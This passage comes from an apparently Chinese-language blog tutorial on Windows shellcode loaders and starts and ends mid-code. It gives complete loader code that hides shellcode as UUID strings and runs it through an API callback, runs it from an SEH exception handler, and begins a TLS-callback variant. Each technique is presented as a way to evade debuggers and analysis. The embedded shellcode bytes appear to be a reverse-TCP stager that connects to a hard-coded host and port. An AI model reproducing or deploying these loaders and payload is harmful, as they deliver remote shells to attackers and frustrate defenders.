class="string">b&quot;\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x8b\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x18\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x56\x6a\x00\x53\xff\xd5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存放shellcode转换成的uuid</span></span><br><span class="line">uuid_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保 shellcode 长度是 16 的倍数，用 NOPs (\x90) 进行填充</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    shellcode += <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每16字节为一组，遍历 shellcode</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">16</span>):</span><br><span class="line">    chunk = shellcode[i:i + <span class="number">16</span>]</span><br><span class="line">    <span class="comment"># 为每组创建一个 UUID（GUID）</span></span><br><span class="line">    uuid_chunk = uuid.UUID(bytes_le=chunk)</span><br><span class="line">    uuid_list.append(<span class="built_in">str</span>(uuid_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出uuid的c语言数组形式</span></span><br><span class="line">uuids = <span class="string">&quot;const char* uuids[] = &#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> uuid <span class="keyword">in</span> uuid_list:</span><br><span class="line">    uuids = uuids + <span class="string">f&quot;\&quot;<span class="subst">&#123;uuid&#125;</span>\&quot;,&quot;</span></span><br><span class="line">uuids = uuids[:-<span class="number">1</span>] + <span class="string">&quot;&#125;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(uuids)</span><br></pre></td></tr></table></figure>



<h2 id="uuid写入shellcode"><a href="#uuid写入shellcode" class="headerlink" title="uuid写入shellcode"></a>uuid写入shellcode</h2><p>以下代码的主要目的是通过UUID加载并执行shellcode。代码的关键步骤如下：</p>
<ol>
<li>定义一个包含转换为UUID形式的shellcode字符串数组<code>uuids</code>。</li>
<li>创建一个具有执行权限的堆<code>hc</code>。</li>
<li>在堆上分配一块可执行内存<code>buffer</code>。</li>
<li>检查内存分配是否成功，如果失败则输出错误信息并返回。</li>
<li>将UUID值转换回原始的shellcode并将其存储在<code>buffer_backup</code>地址。</li>
<li>使用<code>EnumSystemLocalesA</code>函数调用转换回的shellcode。这是通过将shellcode作为处理每个枚举到的区域设置信息的回调函数的地址传递给<code>EnumSystemLocalesA</code>函数实现的。</li>
<li>关闭内存句柄。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存放shellcode转的uuid的数组</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* uuids[] = &#123; <span class="string">&quot;008fe8fc-0000-3160-d264-8b523089e58b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c74975ef52&quot;</span>,<span class="string">&quot;10528b57-428b-013c-d08b-407885c0744c&quot;</span>,<span class="string">&quot;8b50d001-2058-488b-1801-d385c9743c31&quot;</span>,<span class="string">&quot;348b49ff-018b-31d6-c0c1-cf0dac01c738&quot;</span>,<span class="string">&quot;03f475e0-f87d-7d3b-2475-e0588b582401&quot;</span>,<span class="string">&quot;0c8b66d3-8b4b-1c58-01d3-8b048b01d089&quot;</span>,<span class="string">&quot;5b242444-615b-5a59-51ff-e0585f5a8b12&quot;</span>,<span class="string">&quot;ffff80e9-5dff-3368-3200-00687773325f&quot;</span>,<span class="string">&quot;774c6854-0726-e889-ffd0-b89001000029&quot;</span>,<span class="string">&quot;685054c4-8029-006b-ffd5-6a0a68c0a82f&quot;</span>,<span class="string">&quot;0002689b-5c11-e689-5050-505040504050&quot;</span>,<span class="string">&quot;df0fea68-ffe0-97d5-6a10-56576899a574&quot;</span>,<span class="string">&quot;85d5ff61-74c0-ff0a-4e08-75ece8670000&quot;</span>,<span class="string">&quot;6a006a00-5604-6857-02d9-c85fffd583f8&quot;</span>,<span class="string">&quot;8b367e00-6a36-6840-0010-0000566a0068&quot;</span>,<span class="string">&quot;e553a458-d5ff-5393-6a00-5653576802d9&quot;</span>,<span class="string">&quot;d5ff5fc8-f883-7d00-2858-68004000006a&quot;</span>,<span class="string">&quot;0b685000-0f2f-ff30-d557-68756e4d61ff&quot;</span>,<span class="string">&quot;ff5e5ed5-240c-850f-70ff-ffffe99bffff&quot;</span>,<span class="string">&quot;29c301ff-75c6-c3c1-bbf0-b5a2566a0053&quot;</span>,<span class="string">&quot;9090d5ff-9090-9090-9090-909090909090&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">UuidLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆</span></span><br><span class="line">    HANDLE hc = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在堆上分配一块可执行内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">HeapAlloc</span>(hc, <span class="number">0</span>, <span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查内存分配是否成功，如果失败则输出错误信息并返回0</span></span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;内存申请失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    PBYTE buffer_backup = (PBYTE)buffer;  <span class="comment">//定义一个存储uuid转换成的二进制字节序列(shellcode)</span></span><br><span class="line">    <span class="type">int</span> elems = <span class="built_in">sizeof</span>(uuids) / <span class="built_in">sizeof</span>(uuids[<span class="number">0</span>]);  <span class="comment">//获取uuid数组元素的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    UuidFromStringA函数将UUID值转换成二进制字节序列,其语法格式如下:</span></span><br><span class="line"><span class="comment">    RPC_STATUS UuidFromStringA(</span></span><br><span class="line"><span class="comment">        RPC_CSTR StringUuid,  //指向uuid形式的字符串的指针</span></span><br><span class="line"><span class="comment">        UUID * Uuid  //用于接收二进制字节序列的指针</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 遍历uuids数组,并将UUID转换回原始的shellcode,然后存储在buffer_backup地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = <span class="built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)buffer_backup);</span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;UuidFromStringA() != S_OK&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">CloseHandle</span>(buffer);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buffer_backup += <span class="number">16</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">   EnumSystemLocalesA函数用于枚举系统中支持的所有区域设置,其语法格式如下:</span></span><br><span class="line"><span class="comment">   BOOL EnumSystemLocalesA(</span></span><br><span class="line"><span class="comment">     LOCALE_ENUMPROCA lpLocaleEnumProc,  //处理每个枚举到的区域设置信息的回调函数的地址</span></span><br><span class="line"><span class="comment">     DWORD            dwFlags  //指定枚举的方式</span></span><br><span class="line"><span class="comment">   );</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="comment">// 使用 EnumSystemLocalesA 函数调用转换回的 shellcode</span></span><br><span class="line">    <span class="built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)buffer, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭内存句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用 UuidLoader 函数</span></span><br><span class="line">    <span class="built_in">UuidLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="9-基于SEH异常处理"><a href="#9-基于SEH异常处理" class="headerlink" title="9.基于SEH异常处理"></a>9.基于SEH异常处理</h1><h2 id="什么是SEH"><a href="#什么是SEH" class="headerlink" title="什么是SEH"></a>什么是SEH</h2><p>SEH（Structured Exception Handling，结构化异常处理）是Windows操作系统中的一种错误处理和异常处理机制。SEH提供了一种强大、灵活且通用的方法来处理异常，它使得开发者能够为应用程序中发生的运行时错误和异常编写自定义的处理代码</p>
<p>SEH的工作原理是在程序中建立一个异常处理函数链。每个异常处理函数都负责处理特定的异常。当程序运行时遇到异常，操作系统会沿着异常处理函数链寻找适当的处理函数。如果找到合适的异常处理函数，系统将调用该函数并处理异常。如果没有找到合适的处理函数，系统将终止程序</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/assets/-M3GuIlaAXU8NbJTCRei/-M7u7TrzN0Wym0qmjjSg/-M7u9bFpgHXC3vjN9d5g/image.png" alt="img"></p>
<p>在C++中，可以使用<code>_try</code>、<code>_except</code>和<code>_finally</code>关键字来实现SEH异常处理。<code>_try</code>块包含可能引发异常的代码；<code>_except</code>块包含处理异常的代码；而<code>_finally</code>块包含在任何情况下都应执行的代码，无论是否发生异常	</p>
<p>SEH的一个重要特点是它与语言无关，因此可以在C、C++等语言中使用。然而，C++提供了另一种异常处理机制：C++异常处理（<code>try</code>、<code>catch</code>和<code>throw</code>关键字）。C++异常处理机制更符合C++语言的面向对象特性，通常在C++程序中更为常用。然而，在某些情况下，SEH仍然具有独特的优势，例如在处理特定的Windows异常或与C代码交互时</p>
<h2 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h2><p>这种方式加载shellcode的一个好处就是在调试器环境下和正常运行环境下表现不同。当程序在调试器中运行时，调试器会接管异常处理，从而使得程序在除零异常处停止，而不会执行shellcode。这使得恶意代码的执行在调试环境下被阻止，为分析和调试带来困难</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储要执行的shellcode</span></span><br><span class="line"><span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7&quot;</span></span><br><span class="line"><span class="string">&quot;\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f\x9b\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义异常处理函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ExceptFilter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	b = <span class="number">1</span>; <span class="comment">// 修改b的值为1，以防止无限循环的异常处理</span></span><br><span class="line">	((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; shellcode)(); <span class="comment">// 强制转换shellcode的类型，并执行</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION; <span class="comment">// 在处理完异常后，程序继续执行异常发生位置的代码</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	EXCEPTION_CONTINUE_EXECUTION返回值会导致程序在处理完异常后重新执行引发异常的那一行代码。</span></span><br><span class="line"><span class="comment">	由于ExceptFilter函数已经修改了变量b的值（将其设置为1），再次执行a / b时将不会触发异常。</span></span><br><span class="line"><span class="comment">	因此，这个程序不会反复加载shellcode</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	异常处理函数的返回值除了有EXCEPTION_CONTINUE_EXECUTION,还有以下两个值:</span></span><br><span class="line"><span class="comment">	EXCEPTION_EXECUTE_HANDLER:异常处理器已处理异常，程序应在_except块内继续执行</span></span><br><span class="line"><span class="comment">	EXCEPTION_CONTINUE_SEARCH:异常处理器未处理异常，程序应继续搜索其他异常处理器</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_try <span class="comment">// 尝试执行可能引发异常的代码块</span></span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="type">int</span> c = a / b; <span class="comment">// 故意执行除零操作以触发异常</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	_except(<span class="built_in">ExceptFilter</span>()) &#123; <span class="comment">// 当异常发生时，调用ExceptFilter函数处理</span></span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="10-基于TLS机制"><a href="#10-基于TLS机制" class="headerlink" title="10.基于TLS机制"></a>10.基于TLS机制</h1><h2 id="什么是TLS"><a href="#什么是TLS" class="headerlink" title="什么是TLS"></a>什么是TLS</h2><p>线程局部存储（Thread Local Storage，TLS）是一种将数据与特定执行线程关联的机制。当在一个线程内部的各个函数调用之间共享数据，但不让其他线程访问时，可以使用TLS</p>
<h2 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h2><p>TLS提供了一个回调函数，在线程初始化和终止时会被调用，这个回调函数会在程序入口点(即main函数)之前执行，调试器通常会在主函数入口点设置断点，因此TLS回调函数经常被用作反调试手段</p>
<p>TLS回调函数允许我们编写并执行任意代码。TLS有两种类型：静态TLS和动态TLS。静态TLS将TLS相关数据硬编码在PE（Portable Executable）文件中，而动态TLS在运行时分配和管理TLS数据。</p>
<p>静态TLS是将TLS相关数据硬编码在PE（Portable Executable，可执行文件）中。静态TLS存储在PE头的<code>IMAGE_DATA_DIRECTORY DataDirectory[9]</code>位置，可以通过该位置找到TLS目录的详细信息</p>
<p>通过在TLS回调函数中加载和执行shellcode，我们可以在程序的正常执行流之前运行这段代码。这种方法可以绕过调试器设置的断点，增加分析和调试的难度</p>
<p>TLS回调函数遵循特殊的编写约定，与DLL主函数类似。回调函数使用以下类型定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span></span></span><br><span class="line"><span class="function"><span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID DllHandle, <span class="comment">//DLL模块的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD Reason, <span class="comment">//调用原因。这个参数与DLL调用时的原因相同，例如：DLL_PROCESS_ATTACH（当进程加载DLL时）、DLL_THREAD_ATTACH（当线程创建时）等</span></span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID Reserved  <span class="comment">//保留参数，通常用于区分DLL是显式加载还是隐式加载</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="实现代码-3"><a href="#实现代码-3" class="headerlink" title="实现代码"></a>实现代码</h2><p>这段代码的核心目的是在程序启动时，通过TLS回调函数来执行Shellcode，而不是在主函数中执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span 